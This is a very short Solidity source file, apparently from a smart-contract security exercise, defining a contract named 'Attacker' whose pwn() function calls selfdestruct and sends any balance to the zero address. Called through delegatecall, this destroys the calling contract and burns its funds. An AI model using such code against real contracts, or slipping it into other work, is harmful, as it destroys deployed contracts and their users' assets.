// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attacker {
    function pwn() external {
        selfdestruct(payable(0));
    }
}
